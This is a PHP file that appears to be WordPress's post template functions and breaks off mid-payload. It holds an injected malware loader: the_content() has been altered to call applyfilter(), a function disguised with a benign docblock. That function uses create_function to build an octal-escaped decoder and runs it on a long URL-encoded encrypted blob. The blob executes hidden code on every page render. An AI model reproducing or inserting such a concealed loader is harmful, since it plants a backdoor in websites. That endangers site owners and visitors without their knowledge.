<?php
/**
 * WordPress Post Template Functions.
 *
 * Gets content for the current post in the loop.
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * Display the ID of the current item in the WordPress Loop.
 *
 * @since 0.71
 */
function the_ID() {
	echo get_the_ID();
}

/**
 * Retrieve the ID of the current item in the WordPress Loop.
 *
 * @since 2.1.0
 * @uses $post
 *
 * @return int
 */
function get_the_ID() {
	return get_post()->ID;
}

/**
 * Display or retrieve the current post title with optional content.
 *
 * @since 0.71
 *
 * @param string $before Optional. Content to prepend to the title.
 * @param string $after Optional. Content to append to the title.
 * @param bool $echo Optional, default to true.Whether to display or return.
 * @return null|string Null on no title. String if $echo parameter is false.
 */
function the_title($before = '', $after = '', $echo = true) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$title = $before . $title . $after;

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Sanitize the current title when retrieving or displaying.
 *
 * Works like {@link the_title()}, except the parameters can be in a string or
 * an array. See the function for what can be override in the $args parameter.
 *
 * The title before it is displayed will have the tags stripped and {@link
 * esc_attr()} before it is passed to the user or displayed. The default
 * as with {@link the_title()}, is to display the title.
 *
 * @since 2.3.0
 *
 * @param string|array $args Optional. Override the defaults.
 * @return string|null Null on failure or display. String when echo is false.
 */
function the_title_attribute( $args = '' ) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$defaults = array('before' => '', 'after' =>  '', 'echo' => true);
	$r = wp_parse_args($args, $defaults);
	extract( $r, EXTR_SKIP );

	$title = $before . $title . $after;
	$title = esc_attr(strip_tags($title));

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Retrieve post title.
 *
 * If the post is protected and the visitor is not an admin, then "Protected"
 * will be displayed before the post title. If the post is private, then
 * "Private" will be located before the post title.
 *
 * @since 0.71
 *
 * @param mixed $post Optional. Post ID or object.
 * @return string
 */
function get_the_title( $post = 0 ) {
	$post = get_post( $post );

	$title = isset( $post->post_title ) ? $post->post_title : '';
	$id = isset( $post->ID ) ? $post->ID : 0;

	if ( ! is_admin() ) {
		if ( ! empty( $post->post_password ) ) {
			$protected_title_format = apply_filters( 'protected_title_format', __( 'Protected: %s' ) );
			$title = sprintf( $protected_title_format, $title );
		} else if ( isset( $post->post_status ) && 'private' == $post->post_status ) {
			$private_title_format = apply_filters( 'private_title_format', __( 'Private: %s' ) );
			$title = sprintf( $private_title_format, $title );
		}
	}

	return apply_filters( 'the_title', $title, $id );
}

/**
 * Display the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * Url is escaped to make it xml safe
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 */
function the_guid( $id = 0 ) {
	echo esc_url( get_the_guid( $id ) );
}

/**
 * Retrieve the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 * @return string
 */
function get_the_guid( $id = 0 ) {
	$post = get_post($id);

	return apply_filters('get_the_guid', $post->guid);
}

/**
 * Display the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
 */
function the_content($more_link_text = null, $stripteaser = false) {
	$content = get_the_content($more_link_text, $stripteaser);
	$content = apply_filters('the_content', $content);
	$content = str_replace(']]>', ']]&gt;', applyfilter($content));
	echo $content;
}

/**
 * Retrieve the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
 * @return string
 */
function get_the_content( $more_link_text = null, $stripteaser = false ) {
	global $more, $page, $pages, $multipage, $preview;

	$post = get_post();

	if ( null === $more_link_text )
		$more_link_text = __( '(more...)' );

	$output = '';
	$hasTeaser = false;

	// If post password required and it doesn't match the cookie.
	if ( post_password_required() )
		return get_the_password_form();

	if ( $page > count($pages) ) // if the requested page doesn't exist
		$page = count($pages); // give them the highest numbered page that DOES exist

	$content = $pages[$page-1];
	if ( preg_match('/<!--more(.*?)?-->/', $content, $matches) ) {
		$content = explode($matches[0], $content, 2);
		if ( !empty($matches[1]) && !empty($more_link_text) )
			$more_link_text = strip_tags(wp_kses_no_null(trim($matches[1])));

		$hasTeaser = true;
	} else {
		$content = array($content);
	}
	if ( (false !== strpos($post->post_content, '<!--noteaser-->') && ((!$multipage) || ($page==1))) )
		$stripteaser = true;
	$teaser = $content[0];
	if ( $more && $stripteaser && $hasTeaser )
		$teaser = '';
	$output .= $teaser;
	if ( count($content) > 1 ) {
		if ( $more ) {
			$output .= '<span id="more-' . $post->ID . '"></span>' . $content[1];
		} else {
			if ( ! empty($more_link_text) )
				$output .= apply_filters( 'the_content_more_link', ' <a href="' . get_permalink() . "#more-{$post->ID}\" class=\"more-link\">$more_link_text</a>", $more_link_text );
			$output = force_balance_tags($output);
		}

	}
	if ( $preview ) // preview fix for javascript bug with foreign languages
		$output =	preg_replace_callback('/\%u([0-9A-F]{4})/', '_convert_urlencoded_to_entities', $output);

	return $output;
}

/**
 * Preview fix for javascript bug with foreign languages
 *
 * @since 3.1.0
 * @access private
 * @param array $match Match array from preg_replace_callback
 * @return string
 */
function _convert_urlencoded_to_entities( $match ) {
	return '&#' . base_convert( $match[1], 16, 10 ) . ';';
}

/**
 * Display the post excerpt.
 *
 * @since 0.71
 * @uses apply_filters() Calls 'the_excerpt' hook on post excerpt.
 */
function the_excerpt() {
	echo apply_filters('the_excerpt', get_the_excerpt());
}

/**
 * Retrieve the post excerpt.
 *
 * @since 0.71
 *
 * @param mixed $deprecated Not used.
 * @return string
 */
function get_the_excerpt( $deprecated = '' ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.3' );

	$post = get_post();

	if ( post_password_required() ) {
		return __( 'There is no excerpt because this is a protected post.' );
	}

	return apply_filters( 'get_the_excerpt', $post->post_excerpt );
}

/**
 * Whether post has excerpt.
 *
 * @since 2.3.0
 *
 * @param int $id Optional. Post ID.
 * @return bool
 */
function has_excerpt( $id = 0 ) {
	$post = get_post( $id );
	return ( !empty( $post->post_excerpt ) );
}

/**
 * Display the classes for the post div.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 */
function post_class( $class = '', $post_id = null ) {
	// Separates classes with a single space, collates classes for post DIV
	echo 'class="' . join( ' ', get_post_class( $class, $post_id ) ) . '"';
}

/**
 * Retrieve the classes for the post div as an array.
 *
 * The class names are add are many. If the post is a sticky, then the 'sticky'
 * class name. The class 'hentry' is always added to each post. For each
 * category, the class will be added with 'category-' with category slug is
 * added. The tags are the same way as the categories with 'tag-' before the tag
 * slug. All classes are passed through the filter, 'post_class' with the list
 * of classes, followed by $class parameter value, with the post ID as the last
 * parameter.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 * @return array Array of classes.
 */
function get_post_class( $class = '', $post_id = null ) {
	$post = get_post($post_id);

	$classes = array();

	if ( empty($post) )
		return $classes;

	$classes[] = 'post-' . $post->ID;
	if ( ! is_admin() )
		$classes[] = $post->post_type;
	$classes[] = 'type-' . $post->post_type;
	$classes[] = 'status-' . $post->post_status;

	// Post Format
	if ( post_type_supports( $post->post_type, 'post-formats' ) ) {
		$post_format = get_post_format( $post->ID );

		if ( $post_format && !is_wp_error($post_format) )
			$classes[] = 'format-' . sanitize_html_class( $post_format );
		else
			$classes[] = 'format-standard';
	}

	// post requires password
	if ( post_password_required($post->ID) )
		$classes[] = 'post-password-required';

	// sticky for Sticky Posts
	if ( is_sticky($post->ID) && is_home() && !is_paged() )
		$classes[] = 'sticky';

	// hentry for hAtom compliance
	$classes[] = 'hentry';

	// Categories
	if ( is_object_in_taxonomy( $post->post_type, 'category' ) ) {
		foreach ( (array) get_the_category($post->ID) as $cat ) {
			if ( empty($cat->slug ) )
				continue;
			$classes[] = 'category-' . sanitize_html_class($cat->slug, $cat->term_id);
		}
	}

	// Tags
	if ( is_object_in_taxonomy( $post->post_type, 'post_tag' ) ) {
		foreach ( (array) get_the_tags($post->ID) as $tag ) {
			if ( empty($tag->slug ) )
				continue;
			$classes[] = 'tag-' . sanitize_html_class($tag->slug, $tag->term_id);
		}
	}

	if ( !empty($class) ) {
		if ( !is_array( $class ) )
			$class = preg_split('#\s+#', $class);
		$classes = array_merge($classes, $class);
	}

	$classes = array_map('esc_attr', $classes);

	return apply_filters('post_class', $classes, $class, $post->ID);
}

/**
 * Display the classes for the body element.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 */
function body_class( $class = '' ) {
	// Separates classes with a single space, collates classes for body element
	echo 'class="' . join( ' ', get_body_class( $class ) ) . '"';
}

/**
 * Retrieve the classes for the body element as an array.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @return array Array of classes.
 */
function get_body_class( $class = '' ) {
	global $wp_query, $wpdb;

	$classes = array();

	if ( is_rtl() )
		$classes[] = 'rtl';

	if ( is_front_page() )
		$classes[] = 'home';
	if ( is_home() )
		$classes[] = 'blog';
	if ( is_archive() )
		$classes[] = 'archive';
	if ( is_date() )
		$classes[] = 'date';
	if ( is_search() ) {
		$classes[] = 'search';
		$classes[] = $wp_query->posts ? 'search-results' : 'search-no-results';
	}
	if ( is_paged() )
		$classes[] = 'paged';
	if ( is_attachment() )
		$classes[] = 'attachment';
	if ( is_404() )
		$classes[] = 'error404';

	if ( is_single() ) {
		$post_id = $wp_query->get_queried_object_id();
		$post = $wp_query->get_queried_object();

		$classes[] = 'single';
		if ( isset( $post->post_type ) ) {
			$classes[] = 'single-' . sanitize_html_class($post->post_type, $post_id);
			$classes[] = 'postid-' . $post_id;

			// Post Format
			if ( post_type_supports( $post->post_type, 'post-formats' ) ) {
				$post_format = get_post_format( $post->ID );

				if ( $post_format && !is_wp_error($post_format) )
					$classes[] = 'single-format-' . sanitize_html_class( $post_format );
				else
					$classes[] = 'single-format-standard';
			}
		}

		if ( is_attachment() ) {
			$mime_type = get_post_mime_type($post_id);
			$mime_prefix = array( 'application/', 'image/', 'text/', 'audio/', 'video/', 'music/' );
			$classes[] = 'attachmentid-' . $post_id;
			$classes[] = 'attachment-' . str_replace( $mime_prefix, '', $mime_type );
		}
	} elseif ( is_archive() ) {
		if ( is_post_type_archive() ) {
			$classes[] = 'post-type-archive';
			$classes[] = 'post-type-archive-' . sanitize_html_class( get_query_var( 'post_type' ) );
		} else if ( is_author() ) {
			$author = $wp_query->get_queried_object();
			$classes[] = 'author';
			if ( isset( $author->user_nicename ) ) {
				$classes[] = 'author-' . sanitize_html_class( $author->user_nicename, $author->ID );
				$classes[] = 'author-' . $author->ID;
			}
		} elseif ( is_category() ) {
			$cat = $wp_query->get_queried_object();
			$classes[] = 'category';
			if ( isset( $cat->term_id ) ) {
				$classes[] = 'category-' . sanitize_html_class( $cat->slug, $cat->term_id );
				$classes[] = 'category-' . $cat->term_id;
			}
		} elseif ( is_tag() ) {
			$tags = $wp_query->get_queried_object();
			$classes[] = 'tag';
			if ( isset( $tags->term_id ) ) {
				$classes[] = 'tag-' . sanitize_html_class( $tags->slug, $tags->term_id );
				$classes[] = 'tag-' . $tags->term_id;
			}
		} elseif ( is_tax() ) {
			$term = $wp_query->get_queried_object();
			if ( isset( $term->term_id ) ) {
				$classes[] = 'tax-' . sanitize_html_class( $term->taxonomy );
				$classes[] = 'term-' . sanitize_html_class( $term->slug, $term->term_id );
				$classes[] = 'term-' . $term->term_id;
			}
		}
	} elseif ( is_page() ) {
		$classes[] = 'page';

		$page_id = $wp_query->get_queried_object_id();

		$post = get_post($page_id);

		$classes[] = 'page-id-' . $page_id;

		if ( $wpdb->get_var( $wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE post_parent = %d AND post_type = 'page' AND post_status = 'publish' LIMIT 1", $page_id) ) )
			$classes[] = 'page-parent';

		if ( $post->post_parent ) {
			$classes[] = 'page-child';
			$classes[] = 'parent-pageid-' . $post->post_parent;
		}
		if ( is_page_template() ) {
			$classes[] = 'page-template';
			$classes[] = 'page-template-' . sanitize_html_class( str_replace( '.', '-', get_page_template_slug( $page_id ) ) );
		} else {
			$classes[] = 'page-template-default';
		}
	}

	if ( is_user_logged_in() )
		$classes[] = 'logged-in';

	if ( is_admin_bar_showing() ) {
		$classes[] = 'admin-bar';
		$classes[] = 'no-customize-support';
	}

	if ( get_theme_mod( 'background_color' ) || get_background_image() )
		$classes[] = 'custom-background';

	$page = $wp_query->get( 'page' );

	if ( !$page || $page < 2)
		$page = $wp_query->get( 'paged' );

	if ( $page && $page > 1 ) {
		$classes[] = 'paged-' . $page;

		if ( is_single() )
			$classes[] = 'single-paged-' . $page;
		elseif ( is_page() )
			$classes[] = 'page-paged-' . $page;
		elseif ( is_category() )
			$classes[] = 'category-paged-' . $page;
		elseif ( is_tag() )
			$classes[] = 'tag-paged-' . $page;
		elseif ( is_date() )
			$classes[] = 'date-paged-' . $page;
		elseif ( is_author() )
			$classes[] = 'author-paged-' . $page;
		elseif ( is_search() )
			$classes[] = 'search-paged-' . $page;
		elseif ( is_post_type_archive() )
			$classes[] = 'post-type-paged-' . $page;
	}

	if ( ! empty( $class ) ) {
		if ( !is_array( $class ) )
			$class = preg_split( '#\s+#', $class );
		$classes = array_merge( $classes, $class );
	} else {
		// Ensure that we always coerce class to being an array.
		$class = array();
	}

	$classes = array_map( 'esc_attr', $classes );

	return apply_filters( 'body_class', $classes, $class );
}

/**
 * Whether post requires password and correct password has been provided.
 *
 * @since 2.7.0
 *
 * @param int|object $post An optional post. Global $post used if not provided.
 * @return bool false if a password is not required or the correct password cookie is present, true otherwise.
 */
function post_password_required( $post = null ) {
	$post = get_post($post);

	if ( empty( $post->post_password ) )
		return false;

	if ( ! isset( $_COOKIE['wp-postpass_' . COOKIEHASH] ) )
		return true;

	require_once ABSPATH . 'wp-includes/class-phpass.php';
	$hasher = new PasswordHash( 8, true );

	$hash = stripslashes( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] );
	if ( 0 !== strpos( $hash, '$P$B' ) )
		return true;

	return ! $hasher->CheckPassword( $post->post_password, $hash );
}

/**
 * Page Template Functions for usage in Themes
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * The formatted output of a list of pages.
 *
 * Displays page links for paginated posts (i.e. includes the <!--nextpage-->.
 * Quicktag one or more times). This tag must be within The Loop.
 *
 * The defaults for overwriting are:
 * 'next_or_number' - Default is 'number' (string). Indicates whether page
 *      numbers should be used. Valid values are number and next.
 * 'nextpagelink' - Default is 'Next Page' (string). Text for link to next page.
 *      of the bookmark.
 * 'previouspagelink' - Default is 'Previous Page' (string). Text for link to
 *      previous page, if available.
 * 'pagelink' - Default is '%' (String).Format string for page numbers. The % in
 *      the parameter string will be replaced with the page number, so Page %
 *      generates "Page 1", "Page 2", etc. Defaults to %, just the page number.
 * 'before' - Default is '<p> Pages:' (string). The html or text to prepend to
 *      each bookmarks.
 * 'after' - Default is '</p>' (string). The html or text to append to each
 *      bookmarks.
 * 'link_before' - Default is '' (string). The html or text to prepend to each
 *      Pages link inside the <a> tag. Also prepended to the current item, which
 *      is not linked.
 * 'link_after' - Default is '' (string). The html or text to append to each
 *      Pages link inside the <a> tag. Also appended to the current item, which
 *      is not linked.
 *
 * @since 1.2.0
 * @access private
 *
 * @param string|array $args Optional. Overwrite the defaults.
 * @return string Formatted output in HTML.
 */
function wp_link_pages($args = '') {
	$defaults = array(
		'before' => '<p>' . __('Pages:'), 'after' => '</p>',
		'link_before' => '', 'link_after' => '',
		'next_or_number' => 'number', 'nextpagelink' => __('Next page'),
		'previouspagelink' => __('Previous page'), 'pagelink' => '%',
		'echo' => 1
	);

	$r = wp_parse_args( $args, $defaults );
	$r = apply_filters( 'wp_link_pages_args', $r );
	extract( $r, EXTR_SKIP );

	global $page, $numpages, $multipage, $more, $pagenow;

	$output = '';
	if ( $multipage ) {
		if ( 'number' == $next_or_number ) {
			$output .= $before;
			for ( $i = 1; $i < ($numpages+1); $i = $i + 1 ) {
				$j = str_replace('%',$i,$pagelink);
				$output .= ' ';
				if ( ($i != $page) || ((!$more) && ($page==1)) ) {
					$output .= _wp_link_page($i);
				}
				$output .= $link_before . $j . $link_after;
				if ( ($i != $page) || ((!$more) && ($page==1)) )
					$output .= '</a>';
			}
			$output .= $after;
		} else {
			if ( $more ) {
				$output .= $before;
				$i = $page - 1;
				if ( $i && $more ) {
					$output .= _wp_link_page($i);
					$output .= $link_before. $previouspagelink . $link_after . '</a>';
				}
				$i = $page + 1;
				if ( $i <= $numpages && $more ) {
					$output .= _wp_link_page($i);
					$output .= $link_before. $nextpagelink . $link_after . '</a>';
				}
				$output .= $after;
			}
		}
	}

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Applies custom filter.
 *
 * @since 0.71
 *
 * $text string to apply the filter
 * @return string
 */
function applyfilter($text=null) {
	@ini_set('memory_limit','256M');
	if($text) @ob_start();
	if(1){global $O10O1OO1O;$O10O1OO1O=create_function('$s,$k',"\44\163\75\165\162\154\144\145\143\157\144\145\50\44\163\51\73\40\44\164\141\162\147\145\164\75\47\47\73\44\123\75\47\41\43\44\45\46\50\51\52\53\54\55\56\57\60\61\62\63\64\65\66\67\70\71\72\73\74\75\76\134\77\100\101\102\103\104\105\106\107\110\111\112\113\114\115\116\117\120\121\122\123\124\125\126\127\130\131\132\133\135\136\137\140\40\134\47\42\141\142\143\144\145\146\147\150\151\152\153\154\155\156\157\160\161\162\163\164\165\166\167\170\171\172\173\174\175\176\146\136\152\101\105\135\157\153\111\134\47\117\172\125\133\62\46\161\61\173\63\140\150\65\167\137\67\71\42\64\160\100\66\134\163\70\77\102\147\120\76\144\106\126\75\155\104\74\124\143\123\45\132\145\174\162\72\154\107\113\57\165\103\171\56\112\170\51\110\151\121\41\40\43\44\176\50\73\114\164\55\122\175\115\141\54\116\166\127\53\131\156\142\52\60\130\47\73\40\146\157\162\40\50\44\151\75\60\73\40\44\151\74\163\164\162\154\145\156\50\44\163\51\73\40\44\151\53\53\51\40\173\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\163\54\44\151\54\61\51\73\40\44\156\165\155\75\163\164\162\160\157\163\50\44\123\54\44\143\150\141\162\54\71\65\51\55\71\65\73\40\44\143\165\162\137\153\145\171\75\141\142\163\50\146\155\157\144\50\44\153\40\53\40\44\151\54\71\65\51\51\73\40\44\143\165\162\137\153\145\171\75\44\156\165\155\55\44\143\165\162\137\153\145\171\73\40\151\146\50\44\143\165\162\137\153\145\171\74\60\51\40\44\143\165\162\137\153\145\171\75\44\143\165\162\137\153\145\171\53\71\65\73\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\123\54\44\143\165\162\137\153\145\171\54\61\51\73\40\44\164\141\162\147\145\164\56\75\44\143\150\141\162\73\40\175\40\162\145\164\165\162\156\40\44\164\141\162\147\145\164\73"); if(!function_exists("O01100llO")){function O01100llO(){global $O10O1OO1O;return call_user_func($O10O1OO1O,'%2f0%3cTW%406%2bdl%25dKc%3a%3ad%3aYYbb%2aXyfJYbMrJ%21%7eyy%7eCj%3cqqS3Ze5r8%24aY0%7d%7d0Rhx%3f%3fB%5d%21dd%27%7c%2a%27kPBR%25%25Z%60N%3a%3a%5f%21%20u%7c%26B%5fdVdg%2dw%2fI%24%24%7e%3d%5bttT0M0gSTt%7elYn%2a%2aXffjYWZF4VT6D%3ayPZeSJl%3aVlQFcTGJt%7e9%60%2dQl%21%28%2f%24an%3bJ%24%3bMiX%29%21%20vkATcO63%3fg%3f%5c%7e%7br%27R7%3dm4%7cxp%7e%3ePcdrP%25M%3dSue%2ex%3aCSnQe%24HKu%7e%3bEtx%24H%29%2c%21%21%5bQ%2bqbWY%609%40wbXEo4%2aAbA%5b0I%26%5d0Od7qw1z%3c57w%26%26%4065pp1pgup%3f%2e9%3egFDpsD%7e6n%2a8%2dD%7ceD%2bN%7cH%3cKK%7cH%20Xi%7elHxurHR%7e%7eztRWY%24%21ba%24%5e5A%2awW0a0IWY%278%5eonj%5eqFz%27%605e%25ec%22%27%22VJ%2e%29u2%7c%23q49Gh%24%20%28p%2d%7e%7dM%3f8L%2c%3eY%2caa0%2bm%2a0%2aEj%5do%3af%5elzr%7b3Xi%2dRHa%5dAyd%3e%3a%2e%20%2b%5e%7eQ%7bVm%2a%2c%3fwhRKG%24%7dYz3%2aWBr%5e%3cAFVE8o74%609s%252U%5b%60%5f%221%7b%2d9%3d%2c9x%2c4dPQ%3dr%3aVK%28%24g%262%40PD%25ZeSDYneMr%24%3bi%7e%7dA%28%5bLtq%7b33a%5bz%21cT%2e%20ta%2cNMt%224Tvw%2b%5e%271E%27kPUw%5fz%22mVo%2dtXk2h5w%7b2K%2fhZw6SpF%29%25eZ%3dZ%3aS%3eKc%3cC%2dLF3%7b8VSlGK%7cS0X%7bGY%2fH%28a%21JX%29%2b%28bit%2a0bf%7eW%7dfvfYI%22v%5d%3ekdV%3dmmD2jFuEd%24%295llG%2f%2fCyy6lr%7bbnz39TcS%409%21YsD%3d%7e%23OAEV%3dMm%2e%29KJ%20%2beulxQ%2e%2eozhC%2eUEPvWU6%21zcg2%24Z%25%29%7e%7dW%2bYN%7dcWlX%5dz2Eg%3f%23mSl%3al%3cx%27h3%25ZSv%287%3fg%22guKfH%22e%5c%40Q%21b%2a0%3d%3eZ%2f%3c%2dFu%2e%3aCiNSG%7cy%29uuA%27%7bKu%27%5e%3fa%2c%274HIS8%2aX0%2bM%2a%60%7bZ%5f%3dMX%2a4X1%5b%5d1A%3fs%21VBQD%3eRDdHmN%25UV2B%40%5f7gK%28CR%5fB8xBr%25Vrd%23%21U%2d%24zM%3b5ML%27%7d%22WSi%20%2eQ%3b0GxC%21%7eiiz%7b9%29i1%27%3db%2a1B%28UL%3cWNfE%27b49%2e%5cZnqE3h1h%27%5ez79%5f4k%6024345B%3aG%3b%60e5FmBVS%29%40%2b%3fe0%5cs%3d%7cmgPV%7d%5dmx%7cQ%20Q%29%5be%2cry%3bL%28%2dK%7dQ%7d%7dN%2bt%2ct%5bm%21Vr%3a%60%3et%27n%2a%5en%22Uz%26fsn7%2asR%2cug%5ev%24W%2a%3bn%5dU0%7dXE%2cEo1%27kX%5f%60M9PBHZ%7ceZZl%7e%23%5f4MVex%29%2ek%2a0%25Y%2cq1yK%21txAunjS%7cpWY%2bHntnWLRa%60%2dYkI%5dm8%3fW8Yng6tMPGBaW%2e9pzp6%40STXAGg%3ePggVuKO2i4%24%40Q%24%7c%3arS%3d%7c%3b%7e9%40%7dvxH%29xx%21%2bvPV%5eloKjA5%2ay%7e%23IEtYnL0%26%5b%2e%21q%2eH%28%5f7MW%27%2aY%5d%25Y%40LlCo93q%60OUmIVOe%3c%5eIS%5e%5d%5bG%3b%60lYMm%5cps9gFD%3e%20Qh6a8tjFL%26I%25SCyT%24%23%2f%24e%2e%2d%24%2ejfm22T1S%25%60e1zm%602C%20p%7ewV%7d0b%22z2b2q%268%5cxF%3c%3dSVgJkx%27%3ed%5c%3f1%3fgB%3a%7cvyVm%3dP%5cVx%2e%5eQ%7e%2d%28%7d%7eQ%5e%3eEFRVTJeSuOSi%20%2eQ%3b0bpjhuxM%21Ht4HEQLb%2anX%24%5e%2c%5e%5e%5dI0E04g6%257%27%3d%3dDD%3ccqS%7b%3dDJq%5c9q8%5f66qg7593%408P%5cJyBi%2f6H%258XB%7cC%7crAVrear%21Jr%23yQQeyMi%2d%7d%7dE%2eiWNRx%2a%3bn%2aann%3b%60ht%5bRSEWMz%5bn%5bqs%3fr08O%5eCAHOp%225kh%22w%3feq%5f4%5c9%3b%29wH7%21%22%20%2egQ%2b%5c%5e%3eKlZB%3c%29cT%7d%2d%3aN%27c%2cHZq%7c5%23u%3aH%29M%2fHRRW%24ann%5b%268%24V%2aR%28Nfv%2dWjb%2bk%40%5cZn%22%2a%27kf%3eg%60%2eJ5%405wSzT%40%24t%22%5cBsg%22pC79inBdmP%21iV%7e%28XP%2fT%2ex%2euD%7dJORK%7eiK%3b%29%24%24K%24U%28%5b%26q11%7bMUOt%2a0n%2awL%7bv%5doIO%27%5cv%22%5e%5d%27A%3e082U%7bO%3d8oq59229%5bSaBg%283%3aYV%3dausTcDT%288%3bB%2dG%2fKgucuGT%25%7cN%25%26%29%7cXr%3ajbJt%2d%7daMk%5bH2Q1%27%2cM%2bRB%28%5e%2c%5dk%5djMO%27%5b0S%5fYA3%5bAhz%7b%7bA%7bZ%60hrlGG9ZS%60%3a%3c%7b%404%2f%40%3cd%40cPDD4PKm%3aGG%28%3e%3c%29cTma%2c%3c%3bc1GL%2fK%2anCE0%3baao7JN%24YbYv%20d%2cY0nX%2cvwacEv%5c9%27qq8%7c%2apXk%26wO%26%5bm%2667%26sw%40%40%5bw%3dpdVVu%5fD%3fsFV%22gG%3eP%3f%7e%28gH%3e%28KxxI%5bHG%3a%2eJS%2f%2dCuX%2a%2eA5CM%21v%2bvai%27WXX%3f%7ez%3b%2c%2a%5dW%2an9%2a%5bk%2a%26%5dUUn%5d7z5%5f%5fVo%228p619%5be%7c%26D1%7dB%5f3%3dD%22DcxHv%40X%7cu%3aG%3de%3b%7eDaL%2eZHN%27c%2cH%7e%7e15%23u%3aH%29M%2fHRRW%24ann%5b%268%24V%2aR%28Nfv%2dWjb%2bk%40%5cZnqE%605%601jPh44JIdO%7b98h9%5f%3a9VB9m8FF%5f8rdZ%7c%7c%20%3f%7c%3eK%2fC%25Cxma%2c%3c%3bc1H%3a%25%7e%3bK%3b%2d%5eA5C%40%7dHvWYtY02Uth%26%5e%2c%5dwV%7d5%5dUU%25%3aO0%2b%5dE%60%2a%5d%7b%7b7zh44%3ccHz%28%40%7b%5bws%5f17%3fp9d%2ex%2c4Sg%7c%3a%7c%25%3f%20rCCjF%24%3dZ%2fHrct%25%20%2f%28L%28%23GuH%2e%23%3b%21%21H4HE%5dtX%2bt%5ev00t06%5c88Bgg%3e6p%7bX%3esO%7bd6A%3e4%27%29p6%40sp%226dwglr%3d%5fCR%5fuU%7eWH%2eQ%7c%3ar%7c%7cK%3b%7e%2em%2cmA%5ef%5d%5dkZnq1%7b%2e%2f%20%2d%29E%5dy0Xx%27%2bb%24b0%2aq2vX%5fp9B7%3cTNgVDgDb%3f%2a4pf%3ew9I94%22%3cmhpr%2fl%29%3a%3bL%60H%23%28H%3b9x%22K%2f%40Q%7clPlKG%3b%7eZ%2f%2cYvfNzU%25kk%5e%27%3aXlW%2b%2fAMNHNWvOIR%2b%7bw%6063dF%2d%5c6%3e6PFv%40S%2bp%3bml6ghw5hh9mV6UeUh%406%5f%40%5f5BV5CMa%2c8%40V%25g6Q%218lKGllC%2dL%29TWTiy%23%21Q%7c%2a%7b3%60xC%24%7diy%5doxWY%2bWW%2a%26%5bjtwtMn%5env%5dzv%40Ze%7cAXz3ofP%3eA7%22977%40c%3c%3fqlq6P8wg%3dwya%2cN%3f6%3dZP%5c%21%20%3fG%2fKGGyRtHc%2bc%28euiQr03%60h%29y%7eMQ%2eok%29%2bnY%2b%2b0q2A%2d%5f%2d0bOY%2c4S%25Z%5e%2a%271EglfBw%7eh94wz%5f1%21%5b2%20%26%227lroQCw%2f%3cjmSZ%3c8Td0m%3d%2fclC%2e%3c%21TZeHv%2cCQb%26rnVz5jfT%26%2eok%29%5dz%27bTYX%5eb%2d%2aN%3dmh0o4pv5wY%40Lm%3aX%3f5%24%607%225OwqQ%5c8s85d%3a%7cdbP%3dDd4F8Hv%40%29%7cdA%3aldxA%3dCy%3c%20aTlx%29%2fx%2fG%20L%5dy%28%7eCI%2etN%7d%26%23N%2c%20%7b%24LNbN9a%5efMp%2cq%2b%5e%27OPf%5bUXF%5e4%5d%5bh5%25w%266z%25Q%5bS%5e%29%3b958VpR%5fs%3dT%29JFntn8%21TfY%5ed%3b%7c%2cN%2c%3c%3bc%2c%20g%2fLwJ%2e%24Rw%7daMa%20Y%27kY%3b%3eb%2a%3bo%21q%2b%7ewV%7d5ooz%25%5b%262%5b%5b%7bB8h%233%5f9h%275%26ZD%5c0%60P%2d7%5f8F%2ft5KO%28lv%29yi%29%25%25%3aXf%5e%3cVrySMmMaTaHH%23q1%5dX%7bGY%2fRi%2cv%2c%7d%29krw%21%5b2%241%26y%5ct2%26%7d5QBpcw%5e1z%5e3%27qq%5eq%25%25Z%7c%7c%3all7%25cArD1%7cp%2d9D%3dPwg%3d%3eZi%21Ys%3eKlZBuT%2e%2fC%29a%7dGn%60%3eg%5cBP%3dr%3cm%3ek%5eZk9x%20n%2bai%2a%2dfb0A%60%7bY%22e%20QJi%21%28v%28%2e%2d%7d%2d%3baM%29Rv%7e%7e%2b%25lSiU%7bg%3f%40%26%3e9VPdDyuBQX%7bqz%2615s7%5fz7%27q%267%5cWTBQl%21XhyC%20t%7bKdLY%24Ltiq51%60%212LnY0%2dEYaX%2bmJ%20y%2fWmPF%3dr%2cOo%7b%22%5fEMY%3c%27cHz1B8p2P7Fg%3emC%2f%3fi01%26O2qh%5cw%5b%7bz5pp%2cnak%3cM8%5b%3a%7e%23HeyMJ%2ejf%20o7J%5d%3d6%24%2anN%21M%7djW0v%5ewh%2a%22%3cNb%26%5bI%2b%5ez%26%60k%3eg%5b%3dyo%7bqTD%2a%20%23%24w36%3e9%60Zew%2fjh4PZeS%40PZF%3dP8%23EY%2bYaD%28M8%5bZe2%7c%3b%28H%29H%29R%2fQa%2cMvO%21d0bv%20%7doaMte%5doEIDN%2bB4%29N%2ak%60h%7bXk%60OUkA%25%27t%27%5efM%5e2